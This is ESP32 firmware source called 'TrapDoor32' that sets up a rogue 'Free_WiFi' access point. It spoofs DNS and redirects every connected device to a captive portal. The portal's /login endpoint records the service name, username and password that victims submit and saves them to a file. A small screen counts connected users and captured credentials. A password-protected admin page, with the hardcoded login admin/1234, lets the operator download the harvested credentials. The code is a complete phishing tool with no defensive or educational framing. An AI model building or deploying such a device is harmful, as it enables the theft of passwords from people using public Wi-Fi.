#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFS.h>
#include <ArduinoJson.h>
#include <TFT_eSPI.h>

// Back-light pin
#define TFT_BL 4  

// Default SoftAP SSID
static const char* DEFAULT_SSID = "Free_WiFi";
// Config file path
const char* CONFIG_PATH = "/config.json";

// Network config
IPAddress AP_IP(192,168,4,1);
IPAddress GW   (192,168,4,1);
IPAddress SN   (255,255,255,0);
const byte  DNS_PORT = 53;

// Admin credentials
static const char* ADMIN_USER = "admin";
static const char* ADMIN_PWD  = "1234";

DNSServer      dnsServer;
AsyncWebServer server(80);
TFT_eSPI       tft;

// Load SSID from SPIFFS (or fallback)
String loadSSID() {
  if (SPIFFS.exists(CONFIG_PATH)) {
    File f = SPIFFS.open(CONFIG_PATH, FILE_READ);
    DynamicJsonDocument doc(256);
    if (deserializeJson(doc, f) == DeserializationError::Ok) {
      String ssid = doc["ssid"].as<String>();
      f.close();
      if (ssid.length()) return ssid;
    }
    f.close();
  }
  return DEFAULT_SSID;
}

// Save SSID to SPIFFS
bool saveSSID(const String &newSSID) {
  DynamicJsonDocument doc(256);
  doc["ssid"] = newSSID;
  File f = SPIFFS.open(CONFIG_PATH, FILE_WRITE);
  if (!f) return false;
  serializeJson(doc, f);
  f.close();
  return true;
}

// Redirect all unknown → captive
void handleNotFound(AsyncWebServerRequest *req) {
  req->redirect(String("http://") + AP_IP.toString() + "/");
}

// Save one credential, keep last 50
void saveCred(const String &svc, const String &user, const String &pass) {
  StaticJsonDocument<1024> doc;
  if (SPIFFS.exists("/creds.json")) {
    File fr = SPIFFS.open("/creds.json", FILE_READ);
    if (fr) { deserializeJson(doc, fr); fr.close(); }
  }
  JsonArray arr = doc.containsKey("entries")
                ? doc["entries"].as<JsonArray>()
                : doc.createNestedArray("entries");
  JsonObject e = arr.createNestedObject();
  e["service"] = svc;
  e["user"]    = user;
  e["pass"]    = pass;
  while (arr.size() > 50) arr.remove(0);
  File fw = SPIFFS.open("/creds.json", FILE_WRITE);
  if (fw) { serializeJson(doc, fw); fw.close(); }
}

// Update TFT stats
void updateDisplay() {
  int clients = WiFi.softAPgetStationNum();
  int creds   = 0;
  if (SPIFFS.exists("/creds.json")) {
    File f = SPIFFS.open("/creds.json", FILE_READ);
    DynamicJsonDocument doc(1024);
    if (deserializeJson(doc, f) == DeserializationError::Ok)
      creds = doc["entries"].as<JsonArray>().size();
    f.close();
  }

  // clear area below header
  tft.fillRect(0, 30, tft.width(), tft.height() - 30, TFT_BLACK);

  tft.setTextSize(2);

  tft.setTextColor(TFT_GREEN);
  tft.drawString("Users:", 10, 40);
  tft.setTextColor(TFT_CYAN);
  tft.drawNumber(clients,  80, 40);

  tft.setTextColor(TFT_GREEN);
  tft.drawString("Creds:", 10, 70);
  tft.setTextColor(TFT_RED);
  tft.drawNumber(creds,    80, 70);
}

void setup() {
  Serial.begin(115200);
  Serial.println("=== Booting ===");

  // 1) Mount SPIFFS
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS init failed");
  }

  // 2) Load or create SSID
  String ssid = loadSSID();
  Serial.printf("Using SSID: %s\n", ssid.c_str());

  // 3) Start AP + DNS
  WiFi.softAPConfig(AP_IP, GW, SN);
  WiFi.softAP(ssid.c_str());
  dnsServer.start(DNS_PORT, "*", AP_IP);
  Serial.print("AP IP: "); Serial.println(WiFi.softAPIP());

  // 4) Web routes
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *req){
    req->send(SPIFFS, "/captive.html", "text/html");
  });
  server.serveStatic("/style.css", SPIFFS, "/style.css");
  server.serveStatic("/script.js", SPIFFS, "/script.js");
  server.serveStatic("/icons/",     SPIFFS, "/icons/");

  // login endpoint
  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *req){},
    nullptr,
    [](AsyncWebServerRequest *req, uint8_t *data, size_t len, size_t, size_t) {
      DynamicJsonDocument j(512);
      if (deserializeJson(j, data, len) == DeserializationError::Ok) {
        saveCred(j["service"].as<String>(),
                 j["user"].as<String>(),
                 j["pass"].as<String>());
        req->send(204);
      } else {
        req->send(400, "application/json", "{\"error\":\"invalid JSON\"}");
      }
    }
  );

  // captive-detection + redirect
  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *req){ req->send(204); });
  server.on("/ncsi.txt",      HTTP_GET, [](AsyncWebServerRequest *req){ req->send(204); });
  server.on("/hotspot-detect.html", HTTP_ANY, handleNotFound);
  server.on("/library/test/success.html", HTTP_ANY, handleNotFound);
  server.on("/fwlink", HTTP_ANY, handleNotFound);
  server.onNotFound(handleNotFound);

  // --- Admin UI & APIs all inline ---
  server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *req){
    if (!req->authenticate(ADMIN_USER, ADMIN_PWD))
      return req->requestAuthentication();
    req->send(200, "text/html", R"rawliteral(
<!DOCTYPE html><html><head>
  <meta charset="utf-8"><title>Admin Panel</title>
  <style>
    body{font-family:sans-serif;padding:20px;}
    .tab{margin-bottom:20px;}
    .tab button{padding:10px;margin-right:10px;}
    #creds,#wifi{display:none;}
  </style>
</head><body>
  <h1>TrapDoor32 Admin</h1>
  <div class="tab">
    <button onclick="show('creds')">Download Creds</button>
    <button onclick="show('wifi')">Change SSID</button>
  </div>
  <div id="creds">
    <a href="/admin/creds.json">Download creds.json</a>
  </div>
  <div id="wifi">
    <form onsubmit="changeSSID(event)">
      <input id="newssid" placeholder="New SSID"/>
      <button type="submit">Save</button>
    </form>
    <div id="result"></div>
  </div>
  <script>
    function show(id){
      document.getElementById('creds').style.display = id==='creds'?'block':'none';
      document.getElementById('wifi').style.display  = id==='wifi'?'block':'none';
      document.getElementById('result').innerText='';
    }
    async function changeSSID(e){
      e.preventDefault();
      let ssid = document.getElementById('newssid').value;
      let res = await fetch('/admin/wifi',{method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({ssid})
      });
      let j = await res.json().catch(_=>({error:true}));
      document.getElementById('result').innerText = 
        j.result==='ok' ? 'SSID changed to '+j.ssid : 'Error';
    }
    show('creds');
  </script>
</body></html>
    )rawliteral");
  });

  // serve creds.json
  server.on("/admin/creds.json", HTTP_GET, [](AsyncWebServerRequest *req){
    if (!req->authenticate(ADMIN_USER, ADMIN_PWD))
      return req->requestAuthentication();
    req->send(SPIFFS, "/creds.json", "application/json");
  });

  // change SSID endpoint
  server.on("/admin/wifi", HTTP_POST, [](AsyncWebServerRequest *req){},
    nullptr,
    [](AsyncWebServerRequest *req, uint8_t *data, size_t len, size_t, size_t) {
      DynamicJsonDocument j(256);
      if (deserializeJson(j, data, len) == DeserializationError::Ok) {
        String newSsid = j["ssid"].as<String>();
        if (newSsid.length() && saveSSID(newSsid)) {
          WiFi.softAPdisconnect(true);
          WiFi.softAP(newSsid.c_str());
          req->send(200, "application/json",
                    String("{\"result\":\"ok\",\"ssid\":\"")+newSsid+"\"}");
          return;
        }
      }
      req->send(400, "application/json", "{\"error\":\"invalid SSID\"}");
    }
  );

  server.begin();
  Serial.println("HTTP server started");

  // 5) TFT init vertical
  tft.init();
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);
  tft.setRotation(0);          // portrait
  tft.fillScreen(TFT_BLACK);

  // header + separator
  tft.setTextSize(2);
  tft.setTextColor(TFT_YELLOW);
  tft.drawString("TrapDoor32", 10, 10);
  tft.drawFastHLine(0, 30, tft.width(), TFT_WHITE);

  // initial zeros
  tft.setTextColor(TFT_CYAN);
  tft.drawNumber(0, 80, 40);
  tft.drawNumber(0, 80, 70);
}

void loop() {
  dnsServer.processNextRequest();
  static unsigned long last = millis();
  if (millis() - last > 2000) {
    last = millis();
    updateDisplay();
  }
}
